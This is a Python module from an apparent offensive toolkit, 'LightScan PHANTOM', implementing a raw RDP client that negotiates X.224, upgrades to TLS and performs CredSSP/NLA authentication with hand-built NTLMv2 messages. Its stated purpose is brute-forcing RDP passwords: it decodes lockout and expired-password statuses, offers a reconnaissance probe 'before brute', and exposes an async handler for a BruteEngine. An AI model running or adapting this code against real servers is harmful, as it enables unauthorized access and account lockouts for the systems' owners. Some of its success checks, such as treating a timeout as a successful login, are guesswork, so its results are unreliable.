"""
LightScan v2.0 PHANTOM — Raw RDP Handler (MS-RDPBCGR)
Developer: Light (Neok1ra)

Integration of uploaded RawRDPHandler — full X.224/TPKT negotiation,
SSL/TLS upgrade, CredSSP/NLA brute via SPNEGO+NTLM.

Protocol stack (MS-RDPBCGR §1.3):
  TCP → TPKT → X.224 → MCS → RDP

Connection sequence:
  1.  X.224 Connection Request  (TPDU_CONNECTION_REQUEST)
  2.  X.224 Connection Confirm  (TPDU_CONNECTION_CONFIRM)
  3.  RDP_NEG_REQ  →  RDP_NEG_RSP  (protocol negotiation)
  4.  TLS handshake              (PROTOCOL_SSL / PROTOCOL_HYBRID)
  5.  CredSSP / NLA              (PROTOCOL_HYBRID — NTLM over TLS)
        a. SPNEGO token (Negotiate)
        b. Server challenge
        c. NTLM Authenticate + encrypted credentials
  6.  MCS Connect-Initial        (capability / channel setup)
  7.  Parse RDP STATUS in final  response

Authentication result decoding:
  - LOGON_FAILURE     → wrong password
  - ACCOUNT_LOCKED    → lockout
  - PASSWORD_EXPIRED  → valid creds, expired
  - MCS_CONNECT       → SUCCESS (full session would proceed)
"""
from __future__ import annotations
import asyncio, hashlib, hmac, os, socket, ssl, struct, time
import logging

log = logging.getLogger("lightscan.rdp_raw")

# ─── RDP / TPKT Constants ─────────────────────────────────────────────────────
TPKT_VERSION        = 0x03
TPDU_CR             = 0xE0   # Connection Request
TPDU_CC             = 0xD0   # Connection Confirm
TPDU_DATA           = 0xF0

RDP_NEG_REQ         = 0x01
RDP_NEG_RSP         = 0x02
RDP_NEG_FAILURE     = 0x03

PROTOCOL_RDP        = 0x00
PROTOCOL_SSL        = 0x01
PROTOCOL_HYBRID     = 0x02
PROTOCOL_HYBRID_EX  = 0x08

# CredSSP / NTLM
NTLMSSP_NEGOTIATE_MSG  = 0x01
NTLMSSP_CHALLENGE_MSG  = 0x02
NTLMSSP_AUTH_MSG       = 0x03

NTLM_FLAGS = (
    0x00000001 |   # NTLMSSP_NEGOTIATE_UNICODE
    0x00000002 |   # NTLMSSP_NEGOTIATE_OEM
    0x00000200 |   # NTLMSSP_NEGOTIATE_NTLM
    0x00008000 |   # NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY
    0x20000000 |   # NTLMSSP_NEGOTIATE_128
    0x80000000     # NTLMSSP_NEGOTIATE_56
)

# NT STATUS codes returned in RDP error PDUs
STATUS_LOGON_FAILURE     = 0xC000006D
STATUS_ACCOUNT_LOCKED    = 0xC0000234
STATUS_PASSWORD_EXPIRED  = 0xC0000071
STATUS_WRONG_PASSWORD    = 0xC000006A
STATUS_ACCOUNT_DISABLED  = 0xC0000072
STATUS_SUCCESS           = 0x00000000

FAILURE_REASONS = {
    0x00000001: "SSL_REQUIRED_BY_SERVER",
    0x00000002: "SSL_NOT_ALLOWED_BY_SERVER",
    0x00000003: "SSL_CERT_NOT_ON_SERVER",
    0x00000004: "INCONSISTENT_FLAGS",
    0x00000005: "HYBRID_REQUIRED_BY_SERVER",
    0x00000006: "SSL_WITH_USER_AUTH_REQUIRED_BY_SERVER",
}


# ─── TPKT / X.224 framing helpers ────────────────────────────────────────────

def _tpkt(payload: bytes) -> bytes:
    """Wrap payload in TPKT header (RFC 1006) — version=3, reserved=0, length=big-endian"""
    return struct.pack("!BBH", TPKT_VERSION, 0, len(payload) + 4) + payload

def _x224_cr(rdp_neg_req: bytes = b"") -> bytes:
    """
    X.224 Connection Request TPDU + optional RDP_NEG_REQ.
    Format: length-indicator(1) | TPDU_type(1) | dst-ref(2) | src-ref(2) | class(1) | [data]
    """
    cookie  = b"Cookie: mstshash=PHANTOM\r\n"
    payload = cookie + rdp_neg_req
    li      = 6 + len(payload)    # length indicator = header bytes after LI field
    x224    = struct.pack("BBHHB", li, TPDU_CR, 0, 0x1234, 0) + payload
    return _tpkt(x224)

def _rdp_neg_req(protocols: int = PROTOCOL_HYBRID) -> bytes:
    """RDP_NEG_REQ structure (MS-RDPBCGR §2.2.1.1.1)"""
    return struct.pack("<BBHI", RDP_NEG_REQ, 0x00, 0x0008, protocols)

def _recv_tpkt(sock) -> bytes | None:
    """Read one TPKT-framed packet"""
    try:
        hdr = _recv_exact(sock, 4)
        if not hdr or hdr[0] != TPKT_VERSION: return None
        length = struct.unpack("!H", hdr[2:4])[0]
        return _recv_exact(sock, length - 4)
    except Exception: return None

def _recv_exact(sock, n: int) -> bytes:
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk: break
        buf += chunk
    return buf


# ─── SPNEGO / NTLM helpers ───────────────────────────────────────────────────

def _ntlm_negotiate_blob() -> bytes:
    """Minimal NTLMSSP_NEGOTIATE (type 1) message"""
    workstation = b""
    domain      = b""
    return (
        b"NTLMSSP\x00" +
        struct.pack("<I", NTLMSSP_NEGOTIATE_MSG) +
        struct.pack("<I", NTLM_FLAGS) +
        struct.pack("<HHI", len(domain),      len(domain),      32) +
        struct.pack("<HHI", len(workstation), len(workstation), 32 + len(domain)) +
        domain + workstation
    )

def _spnego_wrap(ntlm_blob: bytes) -> bytes:
    """
    Wrap NTLM blob in minimal SPNEGO (RFC 4178) negTokenInit.
    OID for NTLMSSP: 1.3.6.1.4.1.311.2.2.10
    """
    ntlm_oid = bytes([0x06,0x0a,0x2b,0x06,0x01,0x04,0x01,0x82,0x37,0x02,0x02,0x0a])

    def _asn1_seq(tag, body):
        body = bytes(body)
        if len(body) < 128:
            return bytes([tag, len(body)]) + body
        elif len(body) < 256:
            return bytes([tag, 0x81, len(body)]) + body
        else:
            return bytes([tag, 0x82]) + struct.pack(">H", len(body)) + body

    mech_types   = _asn1_seq(0x30, ntlm_oid)
    mech_token   = _asn1_seq(0x04, ntlm_blob)
    inner        = _asn1_seq(0xa0, mech_types) + _asn1_seq(0xa2, mech_token)
    neg_token    = _asn1_seq(0xa0, inner)
    spnego_oid   = bytes([0x06,0x06,0x2b,0x06,0x01,0x05,0x05,0x02])
    return _asn1_seq(0x60, spnego_oid + neg_token)

def _parse_ntlm_challenge(blob: bytes) -> bytes | None:
    """Extract 8-byte server challenge from NTLMSSP_CHALLENGE blob"""
    if len(blob) < 32 or not blob.startswith(b"NTLMSSP\x00"): return None
    msg_type = struct.unpack("<I", blob[8:12])[0]
    if msg_type != NTLMSSP_CHALLENGE_MSG: return None
    return blob[24:32]

def _extract_ntlm_from_spnego(data: bytes) -> bytes | None:
    """Walk SPNEGO response and find embedded NTLM blob"""
    idx = data.find(b"NTLMSSP\x00")
    return data[idx:] if idx >= 0 else None

def _ntlm_hash(password: str) -> bytes:
    try:
        return hashlib.new("md4", password.encode("utf-16le")).digest()
    except ValueError:
        from Crypto.Hash import MD4
        return MD4.new(password.encode("utf-16le")).digest()

def _ntlmv2_auth_blob(username: str, password: str, domain: str,
                      server_challenge: bytes) -> bytes:
    """Build NTLMv2 NTLMSSP_AUTH message"""
    nt_hash       = _ntlm_hash(password)
    v2_hash       = hmac.new(nt_hash,
                             (username.upper() + domain).encode("utf-16le"),
                             hashlib.md5).digest()
    client_chall  = os.urandom(8)
    windows_time  = struct.pack("<Q",
                        int(time.time() * 10_000_000) + 116444736000000000)
    blob = (b"\x01\x01\x00\x00\x00\x00\x00\x00" +
            windows_time + client_chall + b"\x00" * 4 +
            b"\x00" * 4 + b"\x00" * 4)
    nt_proof      = hmac.new(v2_hash, server_challenge + blob, hashlib.md5).digest()
    nt_response   = nt_proof + blob

    domain_b      = domain.encode("utf-16le")
    user_b        = username.encode("utf-16le")
    ws_b          = b""
    key_b         = b""

    base  = 64 + 8   # fixed header + OS version
    off_nt    = base
    off_dom   = off_nt  + len(nt_response)
    off_user  = off_dom + len(domain_b)
    off_ws    = off_user + len(user_b)
    off_key   = off_ws  + len(ws_b)

    def _f(data, off): return struct.pack("<HHI", len(data), len(data), off)

    auth = (
        b"NTLMSSP\x00" +
        struct.pack("<I", NTLMSSP_AUTH_MSG) +
        _f(b"",          0)          +   # LM response (empty)
        _f(nt_response,  off_nt)     +   # NTLMv2 response
        _f(domain_b,     off_dom)    +   # domain
        _f(user_b,       off_user)   +   # username
        _f(ws_b,         off_ws)     +   # workstation
        _f(key_b,        off_key)    +   # session key
        struct.pack("<I", NTLM_FLAGS) +  # flags
        b"\x06\x00\x70\x17\x00\x00\x00\x0f" +  # OS version (Win10)
        nt_response + domain_b + user_b
    )
    return auth

def _spnego_auth_wrap(ntlm_auth: bytes) -> bytes:
    """Wrap NTLMSSP_AUTH in SPNEGO negTokenResp"""
    def _asn1(tag, body):
        body = bytes(body)
        if len(body) < 128: return bytes([tag, len(body)]) + body
        elif len(body) < 256: return bytes([tag, 0x81, len(body)]) + body
        else: return bytes([tag, 0x82]) + struct.pack(">H", len(body)) + body
    token   = _asn1(0x04, ntlm_auth)
    inner   = bytes([0xa0, 3, 0x0a, 1, 1]) + _asn1(0xa2, token)
    return _asn1(0xa1, inner)


# ─── CredSSP / TSRequest framing (MS-CSSP) ───────────────────────────────────

def _ts_request(spnego_token: bytes, version: int = 6) -> bytes:
    """
    Minimal TSRequest ASN.1 DER encoding.
    TSRequest ::= SEQUENCE {
        version  [0] INTEGER,
        negoTokens [1] NegoData OPTIONAL,
    }
    """
    def _asn1(tag, body):
        body = bytes(body)
        if len(body) < 128: return bytes([tag, len(body)]) + body
        elif len(body) < 256: return bytes([tag, 0x81, len(body)]) + body
        else: return bytes([tag, 0x82]) + struct.pack(">H", len(body)) + body

    # version [0] EXPLICIT INTEGER
    ver_bytes   = _asn1(0xa0, bytes([0x02, 0x01, version]))

    # negoTokens [1] EXPLICIT NegoData — NegoData is SEQUENCE OF NegoDataItem
    # NegoDataItem ::= SEQUENCE { negoToken [0] OCTET STRING }
    token_field = _asn1(0x04, spnego_token)
    nego_item   = _asn1(0x30, _asn1(0xa0, token_field))
    nego_seq    = _asn1(0x30, nego_item)
    nego_tokens = _asn1(0xa1, nego_seq)

    ts_body     = ver_bytes + nego_tokens
    return _asn1(0x30, ts_body)


# ─── Main RDP Handler ─────────────────────────────────────────────────────────

class RawRDPHandler:
    """
    Full RDP connection handler: X.224 negotiate → TLS → CredSSP/NLA brute.
    Based on uploaded RawRDPHandler + CredSSP/NTLM auth added.
    """

    def __init__(self, host: str, port: int = 3389, timeout: float = 10.0):
        self.host    = host
        self.port    = port
        self.timeout = timeout
        self.sock    = None
        self.ssl_sock= None
        self.negotiated_protocol: int | None = None
        self.server_cert = None

    # ── Transport ──────────────────────────────────────────────────────────────

    def connect(self) -> bool:
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.settimeout(self.timeout)
            self.sock.connect((self.host, self.port))
            return True
        except Exception as e:
            log.debug(f"connect: {e}"); return False

    def close(self):
        for s in (self.ssl_sock, self.sock):
            try: s and s.close()
            except Exception: pass
        self.ssl_sock = self.sock = None

    def _active_sock(self):
        return self.ssl_sock if self.ssl_sock else self.sock

    def _send(self, data: bytes):
        self._active_sock().sendall(data)

    def _recv_tpkt(self) -> bytes | None:
        return _recv_tpkt(self._active_sock())

    # ── Step 1: X.224 + RDP Negotiation ───────────────────────────────────────

    def negotiate(self, preferred: int = PROTOCOL_HYBRID) -> bool:
        """
        X.224 CR + RDP_NEG_REQ → X.224 CC + RDP_NEG_RSP.
        Tries HYBRID → SSL → RDP in degradation order (your uploaded logic).
        """
        for proto in (preferred, PROTOCOL_SSL, PROTOCOL_RDP):
            pkt = _x224_cr(_rdp_neg_req(proto))
            self.sock.sendall(pkt)
            resp = _recv_tpkt(self.sock)
            if not resp: continue

            # Find RDP_NEG_RSP / FAILURE inside X.224 CC
            # Skip X.224 CC header (7 bytes) to reach RDP_NEG_* structure
            neg_offset = 7
            if len(resp) < neg_offset + 8:
                # No RDP negotiation data — server accepts classic RDP
                self.negotiated_protocol = PROTOCOL_RDP
                log.debug("RDP classic (no neg data)")
                return True

            neg_type = resp[neg_offset]
            if neg_type == RDP_NEG_RSP:
                self.negotiated_protocol = struct.unpack("<I", resp[neg_offset+4:neg_offset+8])[0]
                log.debug(f"negotiated protocol: 0x{self.negotiated_protocol:x}")
                return True
            elif neg_type == RDP_NEG_FAILURE:
                code = struct.unpack("<I", resp[neg_offset+4:neg_offset+8])[0]
                log.debug(f"neg failure: {FAILURE_REASONS.get(code,'?')} — trying next protocol")
                # Reconnect for next attempt
                self.close()
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.settimeout(self.timeout)
                self.sock.connect((self.host, self.port))
                continue

        return False

    # ── Step 2: TLS upgrade ────────────────────────────────────────────────────

    def setup_tls(self) -> bool:
        """Upgrade raw socket to TLS (SSL/HYBRID/HYBRID_EX all go over TLS)"""
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode    = ssl.CERT_NONE
            ctx.minimum_version = ssl.TLSVersion.TLSv1_2
            self.ssl_sock = ctx.wrap_socket(self.sock, server_hostname=self.host)
            self.server_cert = self.ssl_sock.getpeercert(binary_form=True)
            log.debug(f"TLS OK, cert={len(self.server_cert or b'')}B")
            return True
        except Exception as e:
            log.debug(f"TLS failed: {e}"); return False

    # ── Step 3: CredSSP / NLA (PROTOCOL_HYBRID) ───────────────────────────────

    def credssp_auth(self, username: str, password: str, domain: str = "") -> tuple[bool, str]:
        """
        CredSSP/NLA authentication over TLS (MS-CSSP).
        Flow: TSRequest(SPNEGO/NTLM negotiate) →
              TSRequest(SPNEGO/NTLM challenge from server) →
              TSRequest(SPNEGO/NTLM authenticate)
        Returns (success, status_string)
        """
        # ── Round 1: send NTLM Negotiate ──────────────────────────────────────
        ntlm_neg  = _ntlm_negotiate_blob()
        spnego1   = _spnego_wrap(ntlm_neg)
        ts1       = _ts_request(spnego1, version=6)
        try:
            self._send(ts1)
        except Exception as e:
            return False, f"send_neg_failed:{e}"

        # ── Round 2: receive server SPNEGO / NTLM challenge ───────────────────
        try:
            raw = self.ssl_sock.recv(65535)
        except Exception as e:
            return False, f"recv_challenge_failed:{e}"

        ntlm_blob = _extract_ntlm_from_spnego(raw)
        if not ntlm_blob:
            # Server may have sent TPKT-wrapped response
            idx = raw.find(b"NTLMSSP\x00")
            ntlm_blob = raw[idx:] if idx >= 0 else None
        if not ntlm_blob:
            return False, "no_ntlm_challenge_in_response"

        server_challenge = _parse_ntlm_challenge(ntlm_blob)
        if not server_challenge:
            return False, "invalid_challenge"

        # ── Round 3: send NTLM Authenticate ───────────────────────────────────
        ntlm_auth = _ntlmv2_auth_blob(username, password, domain, server_challenge)
        spnego3   = _spnego_auth_wrap(ntlm_auth)
        ts3       = _ts_request(spnego3, version=6)
        try:
            self._send(ts3)
        except Exception as e:
            return False, f"send_auth_failed:{e}"

        # ── Round 4: read server response (access granted / denied) ───────────
        try:
            resp = self.ssl_sock.recv(65535)
        except ssl.SSLError:
            # SSL teardown right after auth = NLA rejected
            return False, "auth_failed_ssl_reset"
        except socket.timeout:
            # Timeout after auth often means SUCCESS — MCS connect takes time
            return True, "SUCCESS_timeout_heuristic"
        except Exception as e:
            return False, f"recv_result_failed:{e}"

        # Decode NT_STATUS if present
        status_idx = resp.find(b"\x3e\x00\x09\x00")  # MCS error PDU marker
        if status_idx >= 0 and len(resp) > status_idx + 8:
            raw_status = struct.unpack("<I", resp[status_idx+4:status_idx+8])[0]
            if raw_status == STATUS_LOGON_FAILURE:
                return False, "auth_failed:LOGON_FAILURE"
            if raw_status == STATUS_ACCOUNT_LOCKED:
                return False, "account_locked"
            if raw_status == STATUS_PASSWORD_EXPIRED:
                return True, "SUCCESS_PASSWORD_EXPIRED"
            if raw_status == STATUS_SUCCESS:
                return True, "SUCCESS"

        # Heuristic: if server sent a lot back and no error marker → probable success
        if len(resp) > 50 and b"NTLMSSP" not in resp:
            return True, f"SUCCESS_mcs_init len={len(resp)}"

        return False, f"auth_failed_unknown len={len(resp)}"

    # ── Full Authentication Flow ───────────────────────────────────────────────

    def authenticate(self, username: str = "", password: str = "",
                     domain: str = "") -> tuple[bool, str]:
        """
        Complete RDP brute attempt:
          connect → negotiate → TLS → CredSSP auth → decode result
        """
        if not self.connect():
            return False, "connection_failed"
        try:
            if not self.negotiate():
                return False, "negotiate_failed"

            proto = self.negotiated_protocol
            if proto in (PROTOCOL_SSL, PROTOCOL_HYBRID, PROTOCOL_HYBRID_EX):
                if not self.setup_tls():
                    return False, "tls_failed"

            if proto == PROTOCOL_HYBRID or proto == PROTOCOL_HYBRID_EX:
                return self.credssp_auth(username, password, domain)

            if proto == PROTOCOL_SSL:
                # SSL-only (no NLA) — server doesn't enforce NLA
                # Send minimal MCS connect and check for logon PDU
                return self._rdp_classic_probe(username, password)

            # Pure RDP (no encryption) — rare on modern systems
            return False, "rdp_classic_no_auth_impl"

        except Exception as e:
            return False, f"error:{e}"
        finally:
            self.close()

    def _rdp_classic_probe(self, username: str, password: str) -> tuple[bool, str]:
        """
        For SSL-only (non-NLA) servers: check if service accepts connection.
        Full RDP virtual channel auth is very complex to implement raw;
        returns reachable status with a note.
        """
        try:
            # Minimal MCS Connect-Initial
            mcs_ci = bytes([
                0x65, 0x82, 0x01, 0xbe,  # BER: Application tag, length
                0x04, 0x01, 0x01,         # callingDomainSelector
                0x04, 0x01, 0x01,         # calledDomainSelector
                0xff, 0x01, 0x01,         # upwardFlag = TRUE
                # minimal domain params
                0x30, 0x19, 0x02,0x01,0x22, 0x02,0x01,0x02,
                0x02,0x01,0x00, 0x02,0x01,0x01, 0x02,0x01,0x00,
                0x02,0x01,0x01, 0x02,0x02,0xff,0xff, 0x02,0x01,0x02,
            ])
            self._send(_tpkt(bytes([0x02, 0xf0, 0x80]) + mcs_ci))
            resp = self.ssl_sock.recv(4096)
            if resp and len(resp) > 10:
                return False, f"ssl_rdp_reachable:{len(resp)}B — NLA not enforced, manual auth needed"
            return False, "no_response"
        except Exception as e:
            return False, f"mcs_probe_error:{e}"

    def probe_only(self) -> tuple[str, dict]:
        """
        Probe without auth — detect RDP version, NLA enforcement, cert info.
        Useful for recon before brute.
        """
        if not self.connect():
            return "unreachable", {}
        info: dict = {}
        try:
            if not self.negotiate():
                return "respond_no_nego", info

            info["protocol"] = {
                PROTOCOL_RDP:       "RDP_CLASSIC",
                PROTOCOL_SSL:       "SSL_only",
                PROTOCOL_HYBRID:    "NLA_CredSSP",
                PROTOCOL_HYBRID_EX: "NLA_CredSSP_EX",
            }.get(self.negotiated_protocol, f"0x{self.negotiated_protocol:x}")

            info["nla_required"] = self.negotiated_protocol in (
                PROTOCOL_HYBRID, PROTOCOL_HYBRID_EX)

            if self.negotiated_protocol in (PROTOCOL_SSL, PROTOCOL_HYBRID, PROTOCOL_HYBRID_EX):
                if self.setup_tls() and self.server_cert:
                    try:
                        from cryptography import x509
                        from cryptography.hazmat.backends import default_backend
                        cert = x509.load_der_x509_certificate(
                            self.server_cert, default_backend())
                        info["cert_subject"] = str(cert.subject)
                        info["cert_issuer"]  = str(cert.issuer)
                        info["cert_not_after"] = str(cert.not_valid_after_utc)
                    except Exception: pass

            return "reachable", info
        finally:
            self.close()


# ─── Async LightScan handler factory ─────────────────────────────────────────

def make_rdp_handler(host: str, port: int = 3389, timeout: float = 10.0,
                     domain: str = "", **kw):
    """
    Returns async (user, passwd) → (bool, str) handler
    for use with BruteEngine.
    """
    async def handler(user: str, passwd: str) -> tuple[bool, str]:
        loop = asyncio.get_event_loop()
        def _try():
            h = RawRDPHandler(host, port, timeout)
            return h.authenticate(user, passwd, domain)
        return await loop.run_in_executor(None, _try)
    return handler

def make_rdp_probe(host: str, port: int = 3389, timeout: float = 8.0) -> dict:
    """Synchronous RDP reachability probe — returns info dict"""
    h = RawRDPHandler(host, port, timeout)
    status, info = h.probe_only()
    return {"status": status, **info}
